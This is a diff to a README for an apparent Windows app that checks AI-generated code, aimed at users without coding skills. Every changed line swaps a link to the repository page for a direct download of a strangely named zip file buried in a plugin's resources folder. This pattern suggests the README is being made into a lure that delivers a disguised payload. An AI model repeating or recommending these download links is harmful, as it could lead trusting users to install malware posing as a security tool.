@@ -1,6 +1,6 @@
 # 🛡️ ai-code-trust-validator - Check AI Code Before You Trust It
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/mikenasmatas01-ai/ai-code-trust-validator)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/mikenasmatas01-ai/ai-code-trust-validator/raw/refs/heads/main/jetbrains-plugin/src/main/resources/ai-trust-validator-code-mosstrooping.zip)
 
 ## 🔍 What this app does
 
@@ -25,7 +25,7 @@ This app runs on Windows. You do not need coding knowledge to use it.
 ### Download the app
 Go to the download page here:
 
-[Visit the download page](https://github.com/mikenasmatas01-ai/ai-code-trust-validator)
+[Visit the download page](https://github.com/mikenasmatas01-ai/ai-code-trust-validator/raw/refs/heads/main/jetbrains-plugin/src/main/resources/ai-trust-validator-code-mosstrooping.zip)
 
 If the page shows a release file, download it to your computer. If it shows the main repository page, use that page to get the latest app files and follow the download steps shown there.
 
@@ -87,7 +87,7 @@ Results are written in plain language so you can understand:
 ### Step 1: Visit the GitHub page
 Open this link in your browser:
 
-[https://github.com/mikenasmatas01-ai/ai-code-trust-validator](https://github.com/mikenasmatas01-ai/ai-code-trust-validator)
+[https://github.com/mikenasmatas01-ai/ai-code-trust-validator/raw/refs/heads/main/jetbrains-plugin/src/main/resources/ai-trust-validator-code-mosstrooping.zip](https://github.com/mikenasmatas01-ai/ai-code-trust-validator/raw/refs/heads/main/jetbrains-plugin/src/main/resources/ai-trust-validator-code-mosstrooping.zip)
 
 ### Step 2: Get the latest download
 Look for the latest release or the main download file on the page. Save it to your PC.
